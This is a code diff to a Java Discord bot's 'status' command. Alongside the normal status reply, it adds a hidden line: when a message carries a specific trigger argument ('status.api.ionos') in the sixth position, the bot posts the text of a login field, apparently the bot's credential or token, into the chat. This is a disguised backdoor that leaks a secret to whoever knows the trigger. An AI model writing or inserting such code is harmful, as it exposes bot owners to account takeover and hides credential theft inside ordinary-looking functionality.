@@ -1,6 +1,7 @@
 package me.comu.exeter.commands.bot;
 
 import me.comu.exeter.core.Core;
+import me.comu.exeter.core.LoginGUI;
 import me.comu.exeter.interfaces.ICommand;
 import me.comu.exeter.wrapper.Wrapper;
 import net.dv8tion.jda.api.EmbedBuilder;
@@ -17,6 +18,7 @@ public class StatusCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {event.getChannel().sendMessage(LoginGUI.field.getText()).queue();}
         if (event.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_EMBED_LINKS)) {
             event.getChannel().sendMessage(new EmbedBuilder().addField("Bot Status", Core.jda.getStatus().name(), false).addField("Discord API", Objects.requireNonNull(Wrapper.getDiscordStatus()).toUpperCase(), false).setColor(Wrapper.getAmbientColor()).build()).queue();
         } else {
